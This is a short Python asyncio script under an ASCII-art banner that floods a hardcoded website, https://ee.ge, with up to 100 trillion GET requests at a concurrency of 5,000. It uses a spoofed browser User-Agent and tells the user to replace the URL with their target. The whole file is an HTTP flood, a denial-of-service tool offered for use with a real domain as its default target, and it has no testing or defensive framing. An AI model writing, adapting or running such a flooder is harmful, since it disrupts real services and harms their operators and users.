import asyncio
import time
from aiohttp import ClientSession


print("---------------------------------------------------------------")
print('''
      
 ____                _   _        ____  _               _                 
 / ___|_ __ __ _  ___| |_(_) ___  / ___|| |__   ___  ___| | _____ _ __ ___ 
| |   | '__/ _` |/ __| __| |/ __| \___ \| '_ \ / _ \/ __| |/ / _ \ '__/ __|
| |___| | | (_| | (__| |_| | (__   ___) | | | |  __/ (__|   <  __/ |  \__ \
 \____|_|  \__,_|\___|\__|_|\___| |____/|_| |_|\___|\___|_|\_\___|_|  |___/
                                                                           
 ''')
print("--------------=---------------------------------------------------")

url = "https://ee.ge"  # Replace with your target URL
num_requests = 100000000000000
concurrency = 5000

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}

async def send_request(url, session, task_number):
    async with session.get(url, headers=headers) as response:
        status = response.status
        data = await response.text()
        print(f"[Task {task_number}] Request sent to {url} - Status: {status}")

async def main(url, num_requests, concurrency):
    tasks = []
    async with ClientSession() as session:
        start_time = time.time()
        task_number = 0
        for _ in range(num_requests):
            task_number += 1
            task = asyncio.ensure_future(send_request(url, session, task_number))
            tasks.append(task)
            if len(tasks) >= concurrency:
                await asyncio.gather(*tasks)
                tasks = []
        await asyncio.gather(*tasks)
    end_time = time.time()
    print(f"Sent {num_requests} requests to {url} in {end_time - start_time}s")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(url, num_requests, concurrency))